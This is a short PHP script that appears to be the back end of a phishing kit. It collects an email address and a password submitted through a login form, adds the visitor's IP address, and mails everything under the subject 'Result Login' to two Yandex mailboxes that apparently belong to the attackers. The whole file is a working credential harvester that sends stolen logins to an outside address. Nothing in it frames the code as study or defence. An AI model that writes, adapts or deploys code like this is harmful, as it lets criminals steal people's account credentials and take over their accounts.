<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $ai= $_POST['ai'];
 $pr = $_POST['pr'];
 
		$to = "springdollar976@yandex.com, paidghost86@yandex.com";
		
		
         $subject = "Result Login";
		 
		 $message =  "Email Address            : ".$ai."\r\n";
         $message .= "Password           : ".$pr."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "|----------| xLs |--------------| \r\n";
         
		 
		 mail ($to,$subject,$message,$header);
}
?>